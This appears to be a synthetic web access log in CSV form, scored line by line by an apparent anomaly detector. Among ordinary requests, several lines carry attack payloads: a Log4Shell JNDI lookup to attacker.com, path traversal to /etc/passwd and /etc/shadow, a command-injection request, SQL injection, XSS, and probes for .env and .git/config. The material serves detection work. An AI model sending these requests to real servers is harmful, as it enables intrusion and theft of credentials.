score_content,score_session,score_fused,line
1.6165459156036377,730.0606689453125,365.83860743045807,15.168.90.10 - - [10/Jan/2025:12:00:00 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 4958 "-" "curl/7.68.0"
1.4607901573181152,11831.412109375,5916.436449766159,93.239.10.24 - - [10/Jan/2025:12:00:09 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 500 1185 "https://example.com/" "python-requests/2.31.0"
0.6298686861991882,1357.5899658203125,679.1099172532558,17.75.121.35 - - [10/Jan/2025:12:00:11 +0100] "GET /about HTTP/1.1" 302 18137 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.61936616897583,1401.0086669921875,701.3140165805817,28.147.187.251 - - [10/Jan/2025:12:00:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 301 2006 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
6.350560188293457,638.6578369140625,322.504198551178,227.157.60.182 - - [10/Jan/2025:12:00:22 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5995 "https://www.google.com/" "python-requests/2.31.0"
0.3998791575431824,865.8694458007812,433.1346624791622,189.218.54.205 - - [10/Jan/2025:12:00:22 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 201 3964 "https://news.ycombinator.com/" "dirb/2.22"
1.3670375347137451,71.37712097167969,36.372079253196716,177.73.66.203 - - [10/Jan/2025:12:00:22 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 6692 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.6664211750030518,1434.3414306640625,718.5039259195328,176.86.88.102 - - [10/Jan/2025:12:00:24 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 304 3830 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.122774362564087,6045.02099609375,3024.071885228157,235.122.205.10 - - [10/Jan/2025:12:00:25 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 404 981 "https://news.ycombinator.com/" "curl/7.68.0"
2.49415922164917,598.2183837890625,300.35627150535583,238.191.15.214 - - [10/Jan/2025:12:00:26 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13664 "https://twitter.com/" "python-requests/2.31.0"
0.6216967701911926,562.0953369140625,281.35851684212685,205.235.228.204 - - [10/Jan/2025:12:00:31 +0100] "GET /admin HTTP/1.1" 200 10969 "-" "sqlmap/1.5.10#stable"
0.314972460269928,829.0494384765625,414.6822054684162,161.137.216.43 - - [10/Jan/2025:12:00:32 +0100] "GET /admin HTTP/1.1" 200 12395 "https://www.google.com/" "dirb/2.22"
0.4446072578430176,2128.66748046875,1064.5560438632965,40.49.88.237 - - [10/Jan/2025:12:00:37 +0100] "GET /admin HTTP/1.1" 304 16485 "https://twitter.com/" "nikto/2.5.0"
0.24024146795272827,1980.0416259765625,990.1409337222576,211.252.241.133 - - [10/Jan/2025:12:00:39 +0100] "GET /assets/app.css HTTP/1.1" 304 3319 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.5421940088272095,56.31068801879883,28.42644101381302,30.2.80.239 - - [10/Jan/2025:12:00:40 +0100] "GET /search?q=camera HTTP/1.1" 200 17216 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.11060462892055511,562.8580322265625,281.4843184277415,6.148.195.80 - - [10/Jan/2025:12:00:40 +0100] "GET /wp-login.php HTTP/1.1" 200 10339 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
5.300285816192627,808.91650390625,407.1083948612213,172.31.70.39 - - [10/Jan/2025:12:00:41 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 14554 "https://example.com/" "curl/7.68.0"
0.1330958604812622,579.1875,289.66029793024063,141.82.70.37 - - [10/Jan/2025:12:00:41 +0100] "GET /.git/config HTTP/1.1" 200 11579 "https://twitter.com/" "python-requests/2.31.0"
0.3582642674446106,774.71044921875,387.5343567430973,101.46.181.153 - - [10/Jan/2025:12:00:47 +0100] "GET /.env HTTP/1.1" 200 14074 "https://twitter.com/" "nikto/2.5.0"
1.4249120950698853,2085.18115234375,1043.30303221941,21.250.237.194 - - [10/Jan/2025:12:00:49 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 302 17581 "https://twitter.com/" "nikto/2.5.0"
0.3307151794433594,827.6751098632812,414.0029125213623,176.165.182.197 - - [10/Jan/2025:12:00:50 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 10270 "https://news.ycombinator.com/" "nikto/2.5.0"
0.8677298426628113,5115.0087890625,2557.9382594525814,67.234.94.101 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 401 1263 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.30817127227783203,772.3582153320312,386.33319330215454,90.123.119.217 - - [10/Jan/2025:12:00:53 +0100] "GET /admin HTTP/1.1" 200 3799 "https://example.com/" "curl/7.68.0"
0.22539514303207397,613.032958984375,306.62917706370354,210.183.204.28 - - [10/Jan/2025:12:00:55 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13393 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.1554691195487976,563.7208251953125,281.93814715743065,209.178.152.111 - - [10/Jan/2025:12:01:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 6923 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.3029531240463257,726.67919921875,363.99107617139816,190.239.183.147 - - [10/Jan/2025:12:01:03 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2652 "-" "nikto/2.5.0"
2.7818655967712402,81.14500427246094,41.96343493461609,46.79.245.104 - - [10/Jan/2025:12:01:07 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14688 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5096908211708069,66.72661590576172,33.61815336346626,24.56.210.36 - - [10/Jan/2025:12:01:07 +0100] "GET /.env HTTP/1.1" 200 2114 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.8449221253395081,5254.52978515625,2627.6873536407948,184.252.235.89 - - [10/Jan/2025:12:01:16 +0100] "GET /logout HTTP/1.1" 404 890 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.308079719543457,5052.3193359375,2526.8137078285217,16.95.231.141 - - [10/Jan/2025:12:01:16 +0100] "GET /.env HTTP/1.1" 401 602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.5707409381866455,822.3880004882812,411.97937071323395,222.8.61.111 - - [10/Jan/2025:12:01:21 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9347 "https://example.com/" "dirb/2.22"
